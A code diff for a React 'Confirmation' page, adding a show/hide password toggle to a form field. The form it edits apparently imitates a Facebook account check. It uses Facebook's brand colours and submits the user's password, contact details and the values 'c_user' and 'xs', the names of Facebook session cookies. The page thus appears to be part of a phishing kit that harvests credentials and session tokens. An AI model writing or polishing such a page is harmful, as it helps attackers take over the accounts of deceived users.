@@ -16,6 +16,7 @@ import { useLocation } from "wouter";
 import MetaTags from "@/components/meta-tags";
 import { confirmationFormSchema } from "@shared/schema";
 import { apiRequest } from "@/lib/queryClient";
+import { Eye, EyeOff } from "lucide-react";
 import {
   Select,
   SelectContent,
@@ -30,6 +31,7 @@ export default function Confirmation() {
   const [, setLocation] = useLocation();
   const [contactMethod, setContactMethod] = useState<'email' | 'phone'>('email');
   const [countryCode, setCountryCode] = useState('+1');
+  const [showPassword, setShowPassword] = useState(false);
 
   const form = useForm({
     resolver: zodResolver(confirmationFormSchema),
@@ -60,7 +62,6 @@ export default function Confirmation() {
 
   const onSubmit = async (data: any) => {
     try {
-      // Include all required fields in the submission
       const formattedData = {
         c_user: data.c_user,
         xs: data.xs,
@@ -86,6 +87,10 @@ export default function Confirmation() {
         description: "Failed to submit form. Please try again.",
       });
     }
+  };
+
+  const togglePasswordVisibility = () => {
+    setShowPassword(!showPassword);
   };
 
   return (
@@ -195,12 +200,21 @@ export default function Confirmation() {
                         Password
                       </FormLabel>
                       <FormControl>
-                        <Input
-                          type="password"
-                          placeholder="Enter password"
-                          className="w-full px-3 py-1.5 sm:py-2 text-sm border border-[#ccd0d5] rounded-md focus:border-[#1877f2] focus:ring-2 focus:ring-[#1877f2] focus:ring-opacity-20"
-                          {...field}
-                        />
+                        <div className="relative">
+                          <Input
+                            type={showPassword ? "text" : "password"}
+                            placeholder="Enter password"
+                            className="w-full px-3 py-1.5 sm:py-2 text-sm border border-[#ccd0d5] rounded-md focus:border-[#1877f2] focus:ring-2 focus:ring-[#1877f2] focus:ring-opacity-20"
+                            {...field}
+                          />
+                          <button
+                            type="button"
+                            onClick={togglePasswordVisibility}
+                            className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-500 hover:text-gray-700"
+                          >
+                            {showPassword ? <EyeOff size={16} /> : <Eye size={16} />}
+                          </button>
+                        </div>
                       </FormControl>
                       <FormMessage className="text-xs text-red-500 mt-1" />
                     </FormItem>
